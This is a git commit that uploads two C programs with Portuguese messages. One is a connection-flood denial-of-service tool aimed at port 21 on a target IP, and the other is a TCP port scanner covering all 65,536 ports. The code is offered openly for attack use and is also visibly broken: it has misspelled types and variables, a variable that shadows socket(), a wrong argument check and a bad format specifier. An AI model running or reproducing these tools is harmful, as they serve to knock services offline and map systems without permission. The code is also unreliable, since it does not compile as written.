7fb770c961805b5663bfb93b87ab278b02a1eeb5
FelipeBert <108358700+FelipeBert@users.noreply.github.com>
2022-06-28 14:00:33 -0300

    Add files via upload

---
+++ Dos.c
@@ -0,0 +1,39 @@
+#include "stdio.h"
+#include "sys/socket.h"
+#include "netdb.h"
+
+int main(int argc, char *argv[]){
+
+if(argc < 1){
+
+printf("Dos Attack Port 21 - Modo de Uso ./Dos.c 192.168.0.1");
+return 0;
+
+}else{
+
+char *ip = argv[1];
+int porta = 21;
+struct socketaddr_in alvo;
+int conexao;
+int nerverend;
+
+for(neverend = 0; ; neverend++){ 
+
+socket = socket(AF_INET, SOCK_STREAM, 0);
+alvo.sin_family = AF_INET;
+alvo.sin_port = htons(porta);
+alvo.sin_addr.s_addr = inet_addr(ip);
+
+conexao = connect(socket, (struct sockaddr *)&alvo, sizeof alvo);
+
+if(conexao == 0){
+
+printf("Realizando ataque de Dos");
+
+}
+
+}
+
+}
+
+}
---
+++ portscan.c
@@ -0,0 +1,46 @@
+#include "stdio.h"
+#include "netdb.h"
+#include "sys/socket.h"
+
+int main(int argc, char *argv[]){
+
+if(argc < 1){
+
+printf("Portscan - Modo de Uso ./portscan.c 192.168.0.1");
+return 0;
+
+}else{
+
+char *ip = argv[1];
+int socket;
+struct socketaddr_in alvo;
+int porta;
+int conexao;
+
+for(porta = 0; porta < 65536; porta++){
+
+socket = socket(AF_INET, SOCK_STREAM, 0);
+alvo.sin_family = AF_INET;
+alvo.sin_porta = htons(porta);
+alvo.sin_addr.s_addr = inet_addr(ip);
+
+conexao = connect(socket, (struct sockaddr *)&alvo, sizeof alvo);
+
+if(conexao == 0){
+
+	printf("Porta %s [ABERTA]", porta);
+	close(socket);
+	close(conexao);
+
+}
+else{
+
+	close(socket);
+	close(conexao);
+}
+
+}
+
+}
+
+}
